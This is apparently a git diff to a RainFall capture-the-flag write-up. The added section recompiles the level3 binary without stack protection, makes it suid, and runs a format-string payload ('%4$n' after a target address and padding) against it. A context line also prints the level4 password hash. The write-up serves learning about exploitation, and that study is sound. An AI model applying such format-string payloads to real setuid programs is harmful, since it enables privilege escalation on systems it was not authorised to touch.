@@ -88,3 +88,22 @@ level4
 cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
+
+## Recreate Exploited Binary
+
+As user level4, in /tmp, create and compile level3_source.c.
+```
+level4@RainFall:~$ cd /tmp
+level4@RainFall:/tmp$ gcc level3_source.c -fno-stack-protector -o level3_source
+```
+Edit permissions including suid, then move the binary to home directory.
+```
+level4@RainFall:/tmp$ chmod u+s level3_source
+level4@RainFall:/tmp$ chmod +wx ~; mv level3_source ~
+```
+Exit back to user level3, then run the binary.
+```
+level4@RainFall:/tmp$ exit
+exit
+level3@RainFall:~$ (python -c 'print "\x4c\xa0\x04\x08"+"A"*60+"%4$n"' ; cat -) | /home/user/level4/level3_source
+```
